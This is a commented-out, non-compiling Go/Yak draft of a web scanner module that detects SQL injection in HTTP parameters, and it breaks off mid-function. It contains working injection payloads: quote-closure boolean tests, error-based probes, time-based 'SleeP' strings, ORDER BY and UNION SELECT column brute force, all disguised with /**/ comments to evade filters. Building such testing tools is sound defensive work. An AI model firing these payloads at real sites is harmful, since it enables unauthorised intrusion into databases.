package sqlInjection

//
//import (
//	"math"
//	"time"
//)
//
///**
//  @author: yhy
//  @since: 2023/2/6
//  @desc: //TODO
//**/
//
//
///*
//   + 先过滤出有效参数，即不存在转型的参数
//   + 依次进行SQL注入尝试与判定
//*/
//func heuristicCheckIfInjectable(url string , req  []byte , TEMPLATE_PAGE_RSP  []byte ) {
//	freq, err := fuzz.HTTPRequest(req, fuzz.https(isHttps))
//	if err != nil {
//		yakit_output("checkIfInjectable 构建fuzz解析失败" + parseString(err))
//		return
//	}
//
//	templateRsp, err := freq.ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	var body = string(templateRsp.ResponseRaw)
//
//	if err != nil || templateRsp.Error != nil {
//		yakit_output("checkIfInjectable Fuzz请求出错")
//		die(err)
//	}
//
//	for _, value := range FormatExceptionStrings {
//		if str.Contains(body, value) {
//			yakit_output("模板请求参数存在转型错误，请提供正常的请求参数")//和sqlmap一样
//			die("模板请求参数存在转型错误，请提供正常的请求参数")
//		}
//
//	}
//
//	var injectableParamsPos []int //避免POST请求出现参数重名，记录参数位置    //避免POST请求出现参数重名，记录参数位置
//	reqMethod = freq.GetMethod()
//	if reqMethod != "GET" && reqMethod != "POST" {
//	yakit_output("请求方法尚不支持检测")
//	die("请求方法尚不支持检测")
//	}
//
//	randomTestString := getErrorBasedPreCheckPayload()
//	randString = randstr(4)
//	cast := false
//
//	postParams := freq.GetPostJsonParams()
//	if len(postParams) <= 0 {
//	postParams = freq.GetPostParams()
//	}
//	ret := append(freq.GetGetQueryParams(), postParams...)
//
//	CommonParams := ret
//	yakit_output(str.f("总共测试参数共%v个", len(CommonParams)))
//
//	for pos, param := range CommonParams {
//	var rsp, err
//	if str.MatchAllOfRegexp(parseStr(param.Value()[0]), `^[0-9]+$`) {
//	rsp, err = param.Fuzz(randomTestString + randString).ExecFirst(fuzz.WithNamingContext("sql"),
//	fuzz.WithConcurrentLimit(1))
//	time.Sleep(0.5)
//	} else {
//	rsp, err = param.Fuzz(randomTestString + parseStr(randn(1, 9999))).ExecFirst(fuzz.WithNamingContext("sql"),
//	fuzz.WithConcurrentLimit(1))
//	time.Sleep(0.5)
//	}
//
//
//	if err != nil {
//	yakit_output("checkIfInjectable Fuzz请求出错")
//	die(err)
//	}
//
//	_, body := str.SplitHTTPHeadersAndBodyFromPacket(rsp.ResponseRaw)
//
//	body = string(body)
//
//	var cast
//
//	for _, value := range FORMAT_EXCEPTION_STRINGS {
//	if str.Contains(body, value) {
//	cast = true
//	yakit_output(reqMethod + "参数: " + param.Name() + " 因数值转型无法注入")
//	break
//	}
//
//	}
//
//	if cast {
//	cast = false
//	continue
//	}
//
//	injectableParamsPos = append(injectableParamsPos, pos)
//	yakit_output(reqMethod + "参数: " + param.Name() + " 未检测到转型")
//	}
//
//	if len(injectableParamsPos) == 0 {
//	yakit_output("无可注入参数")
//	die("无可注入参数")
//	}
//
//	if len(CommonParams) != len(injectableParamsPos) {
//	cast = true//说明有部分参数存在转型        //说明有部分参数存在转型
//	}
//
//	for _, pos := range injectableParamsPos {
//	checkSqlInjection(pos, req, cast, TEMPLATE_PAGE_RSP, CommonParams, isHttps)
//	}
//
//}
//
//
//func checkSqlInjection(pos  int , req  []byte , castDetected  bool , TEMPLATE_PAGE_RSP  []byte , CommonParams  []*mutate.FuzzHTTPRequestParam , isHttps bool) {
//	checkErrorBased(pos, req, castDetected, CommonParams)
//	closeType, lineBreak := checkCloseType(pos, req, CommonParams, isHttps)
//	if closeType == -1 {
//		for index, param := range CommonParams {
//			if index == pos {
//				yakit_output("参数:%v未检测到闭合边界", param.Value()[0])
//				return//check next not casted param
//				//check next not casted param
//			}
//
//		}
//
//	}
//
//	checkTimeBasedBlind(pos, req, CommonParams, closeType, lineBreak)
//	//checkBoolBased(pos, freq) //TODO:bool based
//	checkUnionBased(pos, req, TEMPLATE_PAGE_RSP, CommonParams, closeType, lineBreak)
//	//checkStackedInjection
//}
//
//
//func checkErrorBased(pos  int , req  []byte , castDetected  bool , CommonParams  []*mutate.FuzzHTTPRequestParam ) {
//	freq, _ := fuzz.HTTPRequest(req)
//	if castDetected {
//		paramName := ""
//		for index, param := range CommonParams {
//			if index == pos {
//				paramName = param.Name()
//				payload := parseStr(param.Value()[0]) + getErrorBasedPreCheckPayload()
//				result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//				if err != nil {
//					yakit_output("尝试检测 Error-Based SQL Injection Payload 失败")
//					return
//				}
//
//				for DBMS, regexps = range DbmsErrors {
//					if str.MatchAnyOfRegexp(result.ResponseRaw, regexps...) {
//						yakit_output("确认后端数据库报错")
//						codecPayload = string(payload)
//						risk.NewRisk(
//							result.Url,
//							risk.severity("critical"),
//							risk.title(str.f(
//								"ERROR-Based SQL Injection: [%v:%v] Guess DBMS: %v",
//								param.Name(),
//								param.Value(),
//								DBMS,
//							)),
//							risk.titleVerbose(str.f(
//								"可能存在基于错误的 SQL 注入: [参数名:%v 原值:%v] 猜测数据库类型: %v",
//								param.Name(),
//								param.Value(),
//								DBMS,
//							)),
//							risk.type("sqlinjection"),
//						risk.request(result.RequestRaw),
//							risk.response(result.ResponseRaw),
//							risk.payload(payload),
//							risk.parameter(param.Name()),
//					)//考虑增加一些探测payload 比如 extractvalue或者updatexml 这样就能确认，确实可以利用报错点进行注入                        //考虑增加一些探测payload 比如 extractvalue或者updatexml 这样就能确认，确实可以利用报错点进行注入
//						yakit_output("参数: " + paramName + "存在报错注入")
//						return
//					}
//
//				}
//
//				yakit_output("参数: " + paramName + " 不存在报错注入")
//			}
//
//		}
//
//		for index, param := range CommonParams {
//			if index == pos {
//				paramName = param.Name()
//				if str.MatchAllOfRegexp(parseStr(param.Value()[0]), `^[0-9]+$`) {
//					payload := randstr(4) + getErrorBasedPreCheckPayload()
//				} else {
//					payload := parseStr(randn(99999, 9999999)) + getErrorBasedPreCheckPayload()
//				}
//
//
//				result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//				if err != nil {
//					yakit_output("尝试检测 Error-Based SQL Injection Payload 失败")
//					return
//				}
//
//				for DBMS, regexps = range DbmsErrors {
//					if str.MatchAnyOfRegexp(result.ResponseRaw, regexps...) {
//						yakit_output("确认后端数据库报错")
//						codecPayload = string(payload)
//						risk.NewRisk(
//							result.Url,
//							risk.severity("critical"),
//							risk.title(str.f(
//								"ERROR-Based SQL Injection: [%v:%v] Guess DBMS: %v",
//								param.Name(),
//								param.Value(),
//								DBMS,
//							)),
//							risk.titleVerbose(str.f(
//								"可能存在基于错误的 SQL 注入: [参数名:%v 原值:%v] 猜测数据库类型: %v",
//								param.Name(),
//								param.Value(),
//								DBMS,
//							)),
//							risk.type("sqlinjection"),
//						risk.request(result.RequestRaw),
//							risk.response(result.ResponseRaw),
//							risk.payload(payload),
//							risk.parameter(param.Name()),
//					)//考虑增加一些探测payload 比如 extractvalue或者updatexml 这样就能确认，确实可以利用报错点进行注入                        //考虑增加一些探测payload 比如 extractvalue或者updatexml 这样就能确认，确实可以利用报错点进行注入
//						yakit_output("参数: " + paramName + "存在报错注入")
//						return
//					}
//
//				}
//
//				yakit_output("参数: " + paramName + " 不存在报错注入")
//			}
//
//		}
//
//	} else {
//		paramName := ""
//		for index, param := range CommonParams {
//			if index == pos {
//				paramName = param.Name()
//				payload := parseStr(param.Value()[0]) + getErrorBasedPreCheckPayload()
//				result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//				if err != nil {
//					yakit_output("尝试检测 Error-Based SQL Injection Payload 失败")
//					return
//				}
//
//				for DBMS, regexps = range DbmsErrors {
//					if str.MatchAnyOfRegexp(result.ResponseRaw, regexps...) {
//						yakit_output("确认后端数据库报错")
//						codecPayload = string(payload)
//						//addVul()
//						risk.NewRisk(
//							result.Url,
//							risk.severity("critical"),
//							risk.title(str.f(
//								"ERROR-Based SQL Injection: [%v:%v] Guess DBMS: %v",
//								param.Name(),
//								param.Value(),
//								DBMS,
//							)),
//							risk.titleVerbose(str.f(
//								"可能存在基于错误的 SQL 注入: [参数名:%v 原值:%v] 猜测数据库类型: %v",
//								param.Name(),
//								param.Value(),
//								DBMS,
//							)),
//							risk.type("sqlinjection"),
//						risk.request(result.RequestRaw),
//							risk.response(result.ResponseRaw),
//							risk.payload(payload),
//							risk.parameter(param.Name()),
//					)//考虑增加一些探测payload 比如 extractvalue或者updatexml 这样就能确认，确实可以利用报错点进行注入                        //考虑增加一些探测payload 比如 extractvalue或者updatexml 这样就能确认，确实可以利用报错点进行注入
//						return
//					}
//
//				}
//
//				yakit_output("参数: " + paramName + "不存在报错注入")
//			}
//
//		}
//
//	}
//
//}
//
//func checkCloseType(pos  int , req  []byte , CommonParams  []*mutate.FuzzHTTPRequestParam , isHttps  bool ) {
//	freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))
//	originResult, err = freq.ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(err)
//		return -1, false
//	}
//
//	for index, param := range CommonParams {
//		if index == pos {
//			numeric := str.MatchAllOfRegexp(parseStr(param.Value()[0]), `^[0-9]+$`)
//			if numeric {
//				closeType := checkParam(param, parseStr(param.Value()[0]), originResult, numeric)
//				if closeType == -1 {
//					closeType = checkParam(param, parseStr(param.Value()[0]) + "\n", originResult, numeric)
//					if closeType == -1 {
//						return -1, false//进行下一个参数的检测
//						//进行下一个参数的检测
//					} else {
//						return closeType, true
//					}
//
//				} else {
//					return closeType, false
//				}
//
//			} else {
//				closeType := checkParam(param, parseStr(param.Value()[0]), originResult, numeric)
//				if closeType == -1 {
//					closeType = checkParam(param, parseStr(param.Value()[0]) + "\n", originResult, numeric)
//					if closeType == -1 {
//						return -1, false
//					} else {
//						return closeType, true
//					}
//
//				} else {
//					return closeType, false
//				}
//
//			}
//
//		}
//
//	}
//
//}
//
//
//func checkTimeBasedBlind(pos  int , req  []byte , CommonParams  []*mutate.FuzzHTTPRequestParam , closeType  int , lineBreak  bool ) {
//	var payload
//	freq, _ := fuzz.HTTPRequest(req)
//
//	err, standardRespTime := getNormalRespondTime(req)
//	if err != nil {
//		yakit_output(parseStr(err))//因获取响应时间出错 不再继续测试时间盲注        //因获取响应时间出错 不再继续测试时间盲注
//		return
//	}
//
//	yakit_output("网站的正常响应时间应小于:" + parseStr(standardRespTime) + "ms")
//	if lineBreak {
//		payload = sprintf(`%v/**/And/**/SleeP(%v)#`, ("\n" + CloseType[closeType]), standardRespTime * 2 / 1000 + 3)
//	} else {
//		payload = sprintf(`%v/**/And/**/SleeP(%v)#`, CloseType[closeType], standardRespTime * 2 / 1000 + 3)
//	}
//
//
//	for index, param := range CommonParams {
//		if index == pos {
//			yakit_output("尝试时间注入")
//			payload = parseStr(param.Value()[0]) + payload
//			result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1),
//				fuzz.WithTimeOut(30))
//			if err != nil {
//				yakit_output("尝试检测 Time-Based Blind SQL Injection Payload 失败")
//				return
//			}
//
//			if result.ServerDurationMs > standardRespTime + 2000 {
//				yakit_output(str.f(
//					"存在基于时间的 SQL 注入: [参数名:%v 原值:%v]",
//					param.Name(),
//					param.Value(),
//				))
//				codecPayload = string(payload)
//				risk.NewRisk(
//					result.Url,
//					risk.severity("critical"),
//					risk.title(str.f(
//						"Time-Based Blind SQL Injection: [%v:%v]",
//						param.Name(),
//						param.Value(),
//					)),
//					risk.titleVerbose(str.f(
//						"存在基于时间的 SQL 注入: [参数名:%v 值:%v]",
//						param.Name(),
//						param.Value(),
//					)),
//					risk.type("sqlinjection"),
//				risk.request(result.RequestRaw),
//					risk.response(result.ResponseRaw),
//					risk.payload(payload),
//					risk.parameter(param.Name()),
//			)
//				return
//			} else {
//				yakit_output("未检测到TimeBased时间盲注")
//				return
//			}
//
//		}
//
//	}
//
//}
//
//func checkUnionBased(pos  int , req  []byte , TEMPLATE_PAGE_RSP  []byte , CommonParams  []*mutate.FuzzHTTPRequestParam , closeType  int , lineBreak  bool ) {
//	if guessColumnNum(pos, req, TEMPLATE_PAGE_RSP, CommonParams, closeType, lineBreak) != -1 {
//		return
//	}
//
//	if bruteColumnNum(pos, req, TEMPLATE_PAGE_RSP, CommonParams, closeType, lineBreak) != -1 {
//		return
//	}
//
//	yakit_output("未检测到UNION联合注入")
//}
//
//
//func guessColumnNum(pos  int , req  []byte , TEMPLATE_PAGE_RSP  []byte , CommonParams  []*mutate.FuzzHTTPRequestParam , closeType  int , lineBreak  bool ) {
//	var payload, result, columnNum
//	freq, _ := fuzz.HTTPRequest(req)
//	ORDER_BY_STEP := 10
//	ORDER_BY_MAX := 100
//	lowCols, highCols = 1, ORDER_BY_STEP
//	found = false
//	DEFAULT_RATIO := -1
//
//	condition_1, DEFAULT_RATIO, _ = orderByTest(1, pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO, CommonParams, closeType,
//		lineBreak)
//	condition_2, DEFAULT_RATIO, _ = orderByTest(randn(9999, 999999), pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO,
//		CommonParams, closeType, lineBreak)
//
//	if condition_1 && !condition_2 {
//		for !found{
//			condition_volatile, DEFAULT_RATIO, _ = orderByTest(highCols, pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO,
//				CommonParams, closeType, lineBreak)
//			if condition_volatile {
//				lowCols = highCols
//				highCols += ORDER_BY_STEP
//
//				if highCols > ORDER_BY_MAX {
//					break
//				}
//
//			} else {
//				for !found{
//					mid = highCols - math.Round((highCols - lowCols) / 2)
//					condition_volatile_sec, DEFAULT_RATIO, result = orderByTest(mid, pos, req, TEMPLATE_PAGE_RSP,
//						DEFAULT_RATIO, CommonParams, closeType,
//						lineBreak)
//					if condition_volatile_sec {
//						lowCols = mid
//					} else {
//						highCols = mid
//					}
//
//					if (highCols - lowCols) < 2 {
//						columnNum = lowCols
//						found = true
//					}
//
//				}
//
//
//				for index, param := range CommonParams {
//					if index == pos {
//						if lineBreak {
//							payload = parseStr(param.Value()[0]) + "\n" + CloseType[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(columnNum) + "#"
//						} else {
//							payload = parseStr(param.Value()[0]) + CloseType[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(columnNum) + "#"
//						}
//
//						risk.NewRisk(
//							result.Url,
//							risk.severity("critical"),
//							risk.title(str.f("Union-Based SQL Injection: [%v:%v]", param.Name(), param.Value())),
//							risk.titleVerbose(str.f(
//								"存在基于UNION SQL 注入: [参数名:%v 值:%v]",
//								param.Name(),
//								param.Value(),
//							)),
//							risk.type("sqlinjection"),
//						risk.payload(payload),
//							risk.parameter(param.Name()),
//					)
//						yakit_output(str.f(
//							"存在基于UNION SQL 注入: [参数名:%v 原值:%v]",
//							param.Name(),
//							param.Value()[0],
//						))
//						yakit_output(str.f("UNION 列数经过ORDER BY 探测为" + parseStr(columnNum)))
//					}
//
//				}
//
//			}
//
//			return columnNum
//		}
//
//	}
//
//	return -1
//}
//
//
//
//func orderByTest(number  int , pos  int , req  []byte , TEMPLATE_PAGE_RSP  []byte , DEFAULT_RATIO  int , CommonParams  []*mutate.FuzzHTTPRequestParam , closeType  int , lineBreak  bool ) {
//	var payload
//	freq, _ := fuzz.HTTPRequest(req)
//	for index, param := range CommonParams {
//		if index == pos {
//			if lineBreak {
//				payload = parseStr(param.Value()[0]) + "\n" + CloseType[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(number) + "#"
//			} else {
//				payload = parseStr(param.Value()[0]) + CloseType[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(number) + "#"
//			}
//
//
//			result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//			if err != nil {
//				yakit_output("尝试检测 Order by 失败")
//				return false
//			}
//
//			condition, DEFAULT_RATIO = comparison(result, TEMPLATE_PAGE_RSP, DEFAULT_RATIO)
//			return !str.MatchAnyOfRegexp(
//				result.ResponseRaw,
//			["(warning|error):", "order (by|clause)", "unknown column", "failed"]...,
//) && condition || str.MatchAnyOfRegexp(
//result.ResponseRaw,
//"data types cannot be compared or sorted",
//), DEFAULT_RATIO, result
//}
//
//}
//
//}
//
//
//
//func comparison(result  fuzzhttp , TEMPLATE_PAGE_RSP  []byte , DEFAULT_RATIO) {
//	codeResult := result.Response.StatusCode
//	TEMPLATE_RSP, err := str.ParseStringToHTTPResponse(TEMPLATE_PAGE_RSP)
//	_, TEMPLATE_BODY := str.SplitHTTPHeadersAndBodyFromPacket(TEMPLATE_PAGE_RSP)
//	_, resultBody := str.SplitHTTPHeadersAndBodyFromPacket(result.ResponseRaw)
//	if err != nil {
//		panic(err)// 畸形响应包        // 畸形响应包
//	}
//
//	TEMPLATE_CODE := TEMPLATE_RSP.StatusCode
//	if codeResult == TEMPLATE_CODE {
//		ratio := str.CalcSimilarity(resultBody, TEMPLATE_BODY)
//		if DEFAULT_RATIO == -1 {
//			if ratio >= LowerRatioBound && ratio <= UpperRatioBound {
//				DEFAULT_RATIO = ratio
//			}
//
//		}
//
//		if ratio > UpperRatioBound {
//			return true, DEFAULT_RATIO
//		} elif ratio < LowerRatioBound{
//			return false, DEFAULT_RATIO
//		} else {
//			return (ratio - DEFAULT_RATIO) > DiffTolerance, DEFAULT_RATIO
//		}
//
//	}
//
//	return false, DEFAULT_RATIO
//}
//
//
//func bruteColumnNum(pos  int , req  []byte , TEMPLATE_PAGE_RSP  []byte , CommonParams  []*mutate.FuzzHTTPRequestParam , closeType  int , lineBreak  bool ) {
//	var payload
//	/* UPPER_COUNT - LOWER_COUNT *MUST* >= 5 */
//	LOWER_COUNT = 1
//	UPPER_COUNT = 15
//
//	err, standardRespTime := getNormalRespondTime(req)
//	if err != nil {
//		yakit_output(parseStr(err))
//		return
//	}
//
//
//	freq, _ := fuzz.HTTPRequest(req)
//	randStr := `"` + randstr(5) + `"` + ","
//
//	TEMPLATE_RSP, err := str.ParseStringToHTTPResponse(TEMPLATE_PAGE_RSP)
//	_, TEMPLATE_BODY := str.SplitHTTPHeadersAndBodyFromPacket(TEMPLATE_PAGE_RSP)
//
//	if err != nil {
//		panic(err)// 畸形响应包        // 畸形响应包
//	}
//
//
//	ratios := make(map[int]float, 0)
//	var ratio
//
//	for index, param := range CommonParams {
//		if index == pos {
//			for i := LOWER_COUNT; i <= UPPER_COUNT; i++ {
//				if lineBreak {
//					payload = parseStr(param.Value()[0]) + "\n" + CloseType[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
//						randStr,
//						i)
//				} else {
//					payload = parseStr(param.Value()[0]) + CloseType[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
//						randStr,
//						i)
//				}
//
//				payload = str.TrimRight(payload, ",") + "#"
//				result, err := param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//				if err != nil {
//					yakit_output("尝试检测 Union SQL Injection Payload 失败")
//					return
//				}
//
//
//				_, resultBody := str.SplitHTTPHeadersAndBodyFromPacket(result.ResponseRaw)
//
//				ratio = str.CalcSimilarity(resultBody, TEMPLATE_BODY)
//				ratios[i - 1] = ratio
//				//yakit_output(parseStr(ratio))
//				time.Sleep(0.3)// 避免过于频繁请求导致速率被限制进而导致结果偏差                // 避免过于频繁请求导致速率被限制进而导致结果偏差
//				continue
//			}
//
//		}
//
//	}
//
//
//	lowest = 1.0
//	highest = 0.0
//	lowest_count = 0
//	highest_count = 0
//	distinguish = -1
//
//	for _, value := range ratios {
//		if value > highest {
//			highest = value
//		}
//
//		if value < lowest {
//			lowest = value
//		}
//
//	}
//
//
//	middle = make([]float)
//	for index, value := range ratios {
//		if value != highest && value != lowest {
//			middle.Append(value)
//			continue
//		}
//
//		if value == lowest {
//			lowest_count = lowest_count + 1
//		}
//
//		if value == highest {
//			highest_count = highest_count + 1
//		}
//
//	}
//
//
//	if len(middle) == 0 && highest != lowest {
//		if highest_count == 1 {
//			distinguish = highest
//		} elif lowest_count == 1 {
//			distinguish = lowest
//		}
//
//	}
//
//
//	if distinguish != -1 {
//		var columnNum = ""
//
//		for index, value := range ratios {
//			if value == distinguish {
//				columnNum = parseStr(index + 1)
//			}
//
//		}
//
//		md5Randstr = randstr(5)
//		for index, param := range CommonParams {
//			if index == pos {
//				if lineBreak {
//					payload = parseStr(param.Value()[0]) + "\n" + CloseType[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
//						str.f(
//							`md5('%v'),`,
//							md5Randstr),
//						parseInt(columnNum))
//				} else {
//					payload = parseStr(param.Value()[0]) + CloseType[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
//						str.f(
//							`md5('%v'),`,
//							md5Randstr),
//						parseInt(columnNum))
//				}
//
//
//				payload = str.TrimRight(payload, ",") + "#"
//				//yakit_output(payload)
//				result, _ := param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//				md5CheckVal := codec.Md5(md5Randstr)
//				//yakit_output(md5CheckVal)
//				//yakit_output(string(result.ResponseRaw))
//				if str.RegexpMatch(md5CheckVal, result.ResponseRaw) {
//					yakit_output(str.f(
//						"存在UNION SQL 注入: [参数名:%v 原值:%v]",
//						param.Name(),
//						param.Value(),
//					))
//					risk.NewRisk(
//						result.Url,
//						risk.severity("critical"),
//						risk.title(str.f("UNION SQL Injection: [%v:%v]", param.Name(), param.Value())),
//						risk.titleVerbose(str.f(
//							"存在UNION SQL 注入: [参数名:%v 值:%v]",
//							param.Name(),
//							param.Value(),
//						)),
//						risk.type("sqlinjection"),
//					risk.request(result.RequestRaw),
//						risk.response(result.ResponseRaw),
//						risk.payload(payload),
//						risk.parameter(param.Name()),
//				)
//					yakit_output(str.f(
//						"存在基于UNION SQL 注入: [参数名:%v 原值:%v]",
//						param.Name(),
//						param.Value()[0],
//					))
//					yakit_output(str.f("UNION 列数经过UNION BruteForce ratio探测为" + columnNum))
//					return parseInt(columnNum)
//				}
//
//			}
//
//		}
//
//	}
//
//
//	for index, param := range CommonParams {
//		if index == pos {
//			for i := LOWER_COUNT; i <= UPPER_COUNT; i++ {
//				if lineBreak {
//					payload = parseStr(param.Value()[0]) + "\n" + CloseType[closeType] + `/**/UniOn/**/Select/**/` + str.Repeat(
//						randStr,
//						(i - 1))
//				} else {
//					payload = parseStr(param.Value()[0]) + CloseType[closeType] + `/**/UniOn/**/Select/**/` + str.Repeat(randStr,
//						(i - 1))
//				}
//
//				payload += sprintf(`SLeep(%v)#`, standardRespTime * 2 / 1000 + 3)
//
//				//println(payload)
//				result, err := param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1),
//					fuzz.WithTimeOut(30))
//				if err != nil {
//					yakit_output("尝试检测 Union SQL Injection Payload 失败")
//					return
//				}
//
//				if result.ServerDurationMs > standardRespTime * 2 + 1000 {
//					yakit_output(str.f(
//						"存在UNION SQL 注入: [参数名:%v 原值:%v]",
//						param.Name(),
//						param.Value(),
//					))
//					//codecPayload = codec.StrconvQuote(string(payload))
//
//					risk.NewRisk(
//						result.Url,
//						risk.severity("critical"),
//						risk.title(str.f("UNION SQL Injection: [%v:%v]", param.Name(), param.Value())),
//						risk.titleVerbose(str.f(
//							"存在UNION SQL 注入: [参数名:%v 值:%v]",
//							param.Name(),
//							param.Value(),
//						)),
//						risk.type("sqlinjection"),
//					risk.request(result.RequestRaw),
//						risk.response(result.ResponseRaw),
//						risk.payload(payload),
//						risk.parameter(param.Name()),
//				)
//					yakit_output(str.f(
//						"可能存在基于UNION SQL 注入: [参数名:%v 原值:%v]",
//						param.Name(),
//						param.Value()[0],
//					))
//					yakit_output(str.f("UNION 列数经过UNION BruteForce sleep探测为" + parseStr(i)))
//					return i
//				} else {
//					time.Sleep(0.5)// 避免过于频繁请求导致结果偏差                    // 避免过于频繁请求导致结果偏差
//					continue
//				}
//
//			}
//
//		}
//
//	}
//
//	return -1
//}
//
//
//func checkBoolBased(pos  int , freq  fuzzhttp ) {  }
//
//
///* 对目标发起5次请求返回正常响应时间 */
//func getNormalRespondTime(req  []byte ) {
//	freq, _ := fuzz.HTTPRequest(req)
//	timeRec := []
////yakit_output(parseString(len(freq.GetCommonParams())))
////time.sleep(5)
//for i := 0; i < 5; i++ {
//rsp, err := freq.ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//time.sleep(0.5)
//if err != nil {
//yakit_output("尝试检测 TimBased-Blind响应时间失败")
//return err, -1
//}
//
//timeRec = append(timeRec, rsp.ServerDurationMs)
//}
//
//
//return nil, (mean(timeRec) + 7 * stdDeviation(timeRec))//99.9999999997440% 正常的响应时间应该小于等于这个值
////99.9999999997440% 正常的响应时间应该小于等于这个值
//}
//
////以下为工具类辅助函数
//func getErrorBasedPreCheckPayload() {
//	randomTestString := ""
//	for i := 0; i < 10; i++ {
//		randomTestString += HeuristicCheckAlphabet[randn(0, len(HeuristicCheckAlphabet) - 1)]
//	}
//
//	return randomTestString
//}
//
//func mean(v) {
//	res = 0
//	n = len(v)
//	for i := 0; i < n; i++ {
//		res += v[i]
//	}
//
//	return res / float(n)
//}
//
//
//func stdDeviation(v) {
//	variance := func(v) {
//		res = 0
//		m = mean(v)
//		n = len(v)
//		for i := 0; i < n; i++ {
//			res += (v[i] - m) * (v[i] - m)
//		}
//
//		return res / float(n - 1)
//	}
//	return math.Sqrt(variance(v))
//}
//
//func checkParam(param, originValue, originResponse, isNumeric) {
//	var res
//	for type := 0; type < len(CloseType); type++ {
//		time.Sleep(0.5)
//		switch type {
//case 0:
//res = checkType0(param, originValue, originResponse, isNumeric)
//if res {
//return 0
//}
//
//case 1:
//res = checkType1(param, originValue, originResponse, isNumeric)
//if res {
//return 1
//}
//
//case 2:
//res = checkType2(param, originValue, originResponse, isNumeric)
//if res {
//return 2
//}
//
//case 3:
//res = checkType3(param, originValue, originResponse, isNumeric)
//if res {
//return 3
//}
//
//case 4:
//res = checkType4(param, originValue, originResponse, isNumeric)
//if res {
//return 4
//}
//
//}
//
//}
//
//res = checkTypeOrderBy(param, originValue, originResponse, isNumeric)
//if res {
//die("检测到ORDER BY")//nothing else to do        //nothing else to do
//}
//
//return -1
//}
//
//
///* 测试 ' 闭合类型 */
//func checkType0(param, originValue, originResponse, IsNumeric) {
//	var positivePayload, negativePayload, paramType
//	defer func {
//		err := recover()
//		if err != nil {
//			yakit_output(err.Error())
//		}
//		return false
//	}
//
//	if IsNumeric {
//		paramType = "数字"
//		rand1 := randn(1, 20000)
//		positivePayload = sprintf("%v'/**/AND/**/'%v'='%v", originValue, rand1, rand1)
//		negativePayload = sprintf("%v'/**/AND/**/'%v'='%v", originValue, rand1, rand1 + 1)
//	} else {
//		paramType = "字符串"
//		randString := randstr(4)
//		positivePayload = sprintf("%v'/**/AND/**/'%v'='%v", originValue, randString, randString)
//		negativePayload = sprintf("%v'/**/AND/**/'%v'='%v", originValue, randString, randstr(5))
//	}
//
//
//	res = originResponse
//	_, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
//
//	p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(sprintf(("request positive rsp error: %s"), err))
//		return false
//	}
//
//	_, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
//
//	n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
//	if err != nil {
//		yakit_output(sprintf("response negative rsp error: %v", err))
//		return false
//	}
//
//	_, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
//
//	if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
//		yakit_output("response empty")
//		return false
//	}
//
//
//	opResult := str.CalcSimilarity(bodyOrigin, pBody)
//
//	if opResult < SimilarityRatio {
//		REASON = sprintf(
//			"参数为%v，假定单引号边界，[%v]与原参数结果不相同",
//			paramType,
//			positivePayload,
//		)
//		yakit_output(REASON)
//		return false
//	}
//
//
//	pnResult := str.CalcSimilarity(pBody, nBody)
//
//	if pnResult > SimilarityRatio {
//		reason = sprintf(
//			"参数为%v，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v",
//			paramType,
//			positivePayload,
//			negativePayload,
//			pnResult,
//		)
//		yakit_output(reason)
//		return false
//	}
//
//
//	yakit_output(sprintf(
//		"疑似SQL注入：【参数：%v型[%v] 单引号闭合】",
//		paramType,
//		originValue,
//	))
//	yakit_output(sprintf(
//		"测试使用的positive payload为: %v 响应包为: %s", positivePayload, string(pBody)
//	))
//	yakit_output(sprintf(
//		"测试使用的negative payload为: %v 响应包为: %s", negativePayload, string(nBody)
//	))
//
//	// risk.NewRisk(res.Url, risk.title(
//	//     sprintf("Maybe SQL Injection: [param - type:str value:%v single-quote]", originValue),
//	// ), risk.titleVerbose(sprintf("疑似SQL注入：【参数：%v[%v] 单引号闭合】",paramType, originValue)), risk.type("sqlinjection"), risk.payload(negativePayload), risk.parameter(param.Name()), risk.request(n1rsp.RequestRaw), risk.response(n1rsp.ResponseRaw))
//	return true
//}
//
//
///* 测试 " 闭合类型 */
//func checkType1(param, originValue, originResponse, IsNumeric) {
//	var positivePayload, negativePayload, paramType
//	defer func {
//		err := recover()
//		if err != nil {
//			yakit_output(err.Error())
//		}
//
//	}
//
//	if IsNumeric {
//		paramType = "数字"
